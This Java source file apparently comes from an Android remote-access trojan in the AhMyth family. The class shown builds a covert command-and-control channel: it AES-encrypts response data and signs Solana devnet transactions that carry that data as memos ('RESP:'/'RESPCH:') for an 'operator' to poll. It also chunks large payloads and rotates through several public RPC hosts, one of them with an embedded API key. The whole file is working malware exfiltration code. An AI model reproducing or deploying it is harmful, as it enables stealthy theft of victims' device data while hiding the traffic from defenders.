package ahmyth.mine.king.ahmyth;

import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

import org.bouncycastle.crypto.params.Ed25519PrivateKeyParameters;
import org.bouncycastle.crypto.signers.Ed25519Signer;

/**
 * BlockchainResponseSender - Sends encrypted responses to Solana channel via memo.
 *
 * Architecture:
 * - Encrypts response data using shared AES key
 * - Signs Solana transaction with memo "RESP:<hex>" (ed25519) and submits via sendTransaction
 * - Operator polls memo instructions
 *
 * Note: Requires client wallet with SOL balance for small fees.
 */
public class BlockchainResponseSender {
    private static final String TAG = "BlockchainResponseSender";
    private static final String SYSTEM_PROGRAM = "11111111111111111111111111111111";
    private static final String MEMO_PROGRAM = "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr";
    private static final int MAX_MEMO_HEX = 900; // keep encrypted memo payload well under RPC size limits
    private static final int CHUNK_SIZE_HEX = 400; // safe memo chunk size after header

    private volatile String rpcUrl;
    private String contractAddress; // channel address (base58)
    private String aesKeyHex;
    private String privateKeyB58; // Client's Solana private key (base58)
    private final List<String> rpcCandidates = new ArrayList<>();
    private volatile int rpcIndex = 0;

    public BlockchainResponseSender(String rpcUrl, String contractAddress, String aesKeyHex, String privateKeyHex) {
        this.rpcUrl = rpcUrl;
        this.contractAddress = contractAddress;
        this.aesKeyHex = aesKeyHex;
        this.privateKeyB58 = privateKeyHex;

        addRpcCandidate(rpcUrl);
        addRpcCandidate("https://solana-devnet.g.alchemy.com/v2/iYpa8brgKRSbCQ9rb1tx8");
        addRpcCandidate("https://api.devnet.solana.com");
        addRpcCandidate("https://solana-devnet.api.onfinality.io/public");
        addRpcCandidate("https://rpc.ankr.com/solana_devnet");
    }

    /**
     * Send response to blockchain
     * @param eventName The event name (e.g., "x0000di")
     * @param data The response data (JSONObject)
     */
    public void sendResponse(String eventName, JSONObject data) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Prepare response JSON
                    JSONObject response = new JSONObject();
                    response.put("event", eventName);
                    response.put("data", data);
                    response.put("timestamp", System.currentTimeMillis());

                    String responseJson = response.toString();
                    Log.d(TAG, "Sending response: " + eventName + " (len=" + responseJson.length() + ")");
                    if (responseJson.length() > 0) {
                        String preview = responseJson.substring(0, Math.min(300, responseJson.length()));
                        Log.d(TAG, "Response payload preview: " + preview + (responseJson.length() > 300 ? "..." : ""));
                    }

                    // Encrypt response
                    byte[] aesKeyBytes = hexStringToByteArray(aesKeyHex);
                    String encryptedHex = BlockchainCrypto.encrypt(responseJson, aesKeyBytes);
                    Log.d(TAG, "Encrypted response length (hex chars): " + encryptedHex.length());

                    if (encryptedHex.length() <= MAX_MEMO_HEX) {
                        sendMemoResponse(encryptedHex);
                    } else {
                        // Split into multiple memos
                        String chunkId = encryptedHex.substring(0, Math.min(10, encryptedHex.length()));
                        int chunkSize = Math.max(200, Math.min(CHUNK_SIZE_HEX, MAX_MEMO_HEX - 64));
                        int totalParts = (int) Math.ceil((double) encryptedHex.length() / chunkSize);
                        Log.w(TAG, "Response too large for single memo (" + encryptedHex.length() + " hex), chunking into " + totalParts + " parts (id=" + chunkId + ")");
                        for (int part = 0; part < totalParts; part++) {
                            int start = part * chunkSize;
                            int end = Math.min(encryptedHex.length(), start + chunkSize);
                            String chunk = encryptedHex.substring(start, end);
                            String memoText = String.format(Locale.US, "RESPCH:%s:%d/%d:%s", chunkId, part + 1, totalParts, chunk);
                            Log.d(TAG, "Sending chunk " + (part + 1) + "/" + totalParts + " (len=" + chunk.length() + ")");
                            sendMemo(memoText);
                        }
                    }

                } catch (Exception e) {
                    Log.e(TAG, "Failed to send response", e);
                }
            }
        }).start();
    }

    /**
     * Build and send Solana transaction with memo RESP:<hex>.
     */
    private void sendMemoResponse(String encryptedHex) {
        sendMemo("RESP:" + encryptedHex);
    }

    private void sendMemo(String memoText) {
        try {
            if (privateKeyB58 == null || privateKeyB58.isEmpty()) {
                Log.w(TAG, "No client private key configured for Solana response");
                return;
            }
            byte[] privKey = Base58.decode(privateKeyB58);
            if (privKey.length != 64) {
                Log.w(TAG, "Client private key must be 64-byte base58 secret");
                return;
            }
            byte[] pubKey = new byte[32];
            System.arraycopy(privKey, 32, pubKey, 0, 32);

            // Fetch recent blockhash
            String blockhash = getLatestBlockhash();
            if (blockhash == null) {
                Log.w(TAG, "Could not fetch recent blockhash");
                return;
            }
            byte[] blockhashBytes = Base58.decode(blockhash);

            byte[] payerPub = pubKey;
            byte[] channelPub = Base58.decode(contractAddress);
            byte[] systemProgram = Base58.decode(SYSTEM_PROGRAM);
            byte[] memoProgram = Base58.decode(MEMO_PROGRAM);

            ByteArrayBuilder msg = new ByteArrayBuilder();
            // Header
            msg.append((byte) 1); // numRequiredSignatures
            msg.append((byte) 0); // numReadonlySignedAccounts
            msg.append((byte) 2); // numReadonlyUnsignedAccounts (system, memo)
            // Accounts
            msg.appendShortVec(4);
            msg.append(payerPub);
            msg.append(channelPub);
            msg.append(systemProgram);
            msg.append(memoProgram);
            // Recent blockhash
            msg.append(blockhashBytes);
            // Instructions
            msg.appendShortVec(2); // two instructions

            // Instruction 0: system transfer 1 lamport (keeps channel in account keys)
            ByteArrayBuilder dataTransfer = new ByteArrayBuilder();
            dataTransfer.appendIntLE(2); // SystemProgram::Transfer
            dataTransfer.appendLongLE(1L); // lamports
            msg.append((byte) 2); // programIdIndex (system program index)
            msg.appendShortVec(2); // account count
            msg.append((byte) 0); // payer
            msg.append((byte) 1); // channel
            msg.appendShortVec(dataTransfer.size());
            msg.append(dataTransfer.toByteArray());

            // Instruction 1: memo RESP:<hex>
            byte[] memoBytes = memoText.getBytes(StandardCharsets.UTF_8);
            msg.append((byte) 3); // memo program index
            msg.appendShortVec(0); // no accounts
            msg.appendShortVec(memoBytes.length);
            msg.append(memoBytes);

            byte[] message = msg.toByteArray();

            // Sign message
            Ed25519Signer signer = new Ed25519Signer();
            signer.init(true, new Ed25519PrivateKeyParameters(privKey, 0));
            signer.update(message, 0, message.length);
            byte[] signature = signer.generateSignature();

            // Assemble transaction: [sig vec][message]
            ByteArrayBuilder tx = new ByteArrayBuilder();
            tx.appendShortVec(1); // one signature
            tx.append(signature);
            tx.append(message);

            String b64 = android.util.Base64.encodeToString(tx.toByteArray(), android.util.Base64.NO_WRAP);
            JSONObject req = new JSONObject();
            req.put("jsonrpc", "2.0");
            req.put("id", 1);
            req.put("method", "sendTransaction");
            JSONArray params = new JSONArray();
            params.put(b64);
            JSONObject opts = new JSONObject();
            opts.put("encoding", "base64");
            opts.put("skipPreflight", true);
            opts.put("maxRetries", 3);
            params.put(opts);
            req.put("params", params);

            String resp = sendRpcRequest(req.toString());
            Log.d(TAG, "Solana response tx send result: " + resp);
        } catch (Exception e) {
            Log.e(TAG, "Failed to send Solana memo response", e);
        }
    }

    private String getLatestBlockhash() {
        try {
            JSONObject req = new JSONObject();
            req.put("jsonrpc", "2.0");
            req.put("id", 1);
            req.put("method", "getLatestBlockhash");
            JSONArray params = new JSONArray();
            JSONObject opts = new JSONObject();
            opts.put("commitment", "processed");
            params.put(opts);
            req.put("params", params);
            String resp = sendRpcRequest(req.toString());
            JSONObject json = new JSONObject(resp);
            JSONObject result = json.optJSONObject("result");
            if (result != null) {
                JSONObject value = result.optJSONObject("value");
                if (value != null) {
                    return value.optString("blockhash", null);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to fetch latest blockhash", e);
        }
        return null;
    }

    /**
     * Send JSON-RPC request
     */
    private String sendRpcRequest(String requestBody) throws Exception {
        int attempts = rpcCandidates.size() > 0 ? rpcCandidates.size() : 1;
        Exception lastErr = null;
        for (int attempt = 0; attempt < attempts; attempt++) {
            int idx = (rpcIndex + attempt) % rpcCandidates.size();
            String candidate = rpcCandidates.get(idx);
            try {
                URL url = new URL(candidate);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = requestBody.getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

                int responseCode = conn.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    try (BufferedReader br = new BufferedReader(
                            new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                        StringBuilder response = new StringBuilder();
                        String responseLine;
                        while ((responseLine = br.readLine()) != null) {
                            response.append(responseLine.trim());
                        }
                        rpcIndex = idx;
                        rpcUrl = candidate;
                        if (attempt > 0) {
                            Log.w(TAG, "Switched RPC to " + candidate + " after failure");
                        }
                        return response.toString();
                    }
                } else {
                    if (responseCode == 429) {
                        Log.w(TAG, "RPC rate limited (429) on " + candidate + ", rotating...");
                        continue;
                    }
                    throw new Exception("HTTP " + responseCode);
                }
            } catch (Exception e) {
                lastErr = e;
                Log.w(TAG, "RPC request failed on " + candidate + " attempt " + (attempt + 1), e);
            }
        }
        throw lastErr != null ? lastErr : new Exception("RPC request failed");
    }

    /**
     * Convert hex string to byte array
     */
    private byte[] hexStringToByteArray(String hex) {
        if (hex.startsWith("0x")) {
            hex = hex.substring(2);
        }
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                    + Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format(Locale.US, "%02x", b));
        }
        return sb.toString();
    }

    private void addRpcCandidate(String rpc) {
        if (rpc == null || rpc.isEmpty()) return;
        if (!rpcCandidates.contains(rpc)) {
            rpcCandidates.add(rpc);
        }
    }

    private static class ByteArrayBuilder {
        private final java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
        void append(byte b) { out.write((int) b); }
        void append(byte[] bytes) { out.write(bytes, 0, bytes.length); }
        void appendIntLE(int v) {
            ByteBuffer bb = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN);
            bb.putInt(v);
            append(bb.array());
        }
        void appendLongLE(long v) {
            ByteBuffer bb = ByteBuffer.allocate(8).order(ByteOrder.LITTLE_ENDIAN);
            bb.putLong(v);
            append(bb.array());
        }
        void appendShortVec(int val) {
            int n = val;
            while (true) {
                int elem = n & 0x7F;
                n >>= 7;
                if (n == 0) {
                    out.write((byte) elem);
                    break;
                } else {
                    out.write((byte) (elem | 0x80));
                }
            }
        }
        int size() { return out.size(); }
        byte[] toByteArray() { return out.toByteArray(); }
    }

    // Minimal Base58 decoder (Solana alphabet)
    private static class Base58 {
        private static final String ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
        private static final int[] INDEXES = new int[128];
        static {
            for (int i = 0; i < INDEXES.length; i++) INDEXES[i] = -1;
            for (int i = 0; i < ALPHABET.length(); i++) INDEXES[ALPHABET.charAt(i)] = i;
        }
        static byte[] decode(String input) {
            if (input == null || input.length() == 0) return new byte[0];
            byte[] input58 = new byte[input.length()];
            for (int i = 0; i < input.length(); ++i) {
                char c = input.charAt(i);
                int digit = c < 128 ? INDEXES[c] : -1;
                if (digit < 0) throw new IllegalArgumentException("Invalid Base58 character: " + c);
                input58[i] = (byte) digit;
            }
            int zeros = 0;
            while (zeros < input58.length && input58[zeros] == 0) zeros++;
            byte[] decoded = new byte[input.length()];
            int j = decoded.length;
            int startAt = zeros;
            while (startAt < input58.length) {
                int mod = divmod58(input58, startAt);
                if (input58[startAt] == 0) ++startAt;
                decoded[--j] = (byte) mod;
            }
            while (j < decoded.length && decoded[j] == 0) ++j;
            byte[] out = new byte[decoded.length - (j - zeros)];
            System.arraycopy(decoded, j - zeros, out, 0, out.length);
            return out;
        }
        private static int divmod58(byte[] number, int startAt) {
            int remainder = 0;
            for (int i = startAt; i < number.length; i++) {
                int digit256 = (int) number[i] & 0xFF;
                int temp = remainder * 58 + digit256;
                number[i] = (byte) (temp / 256);
                remainder = temp % 256;
            }
            return remainder;
        }
    }
}
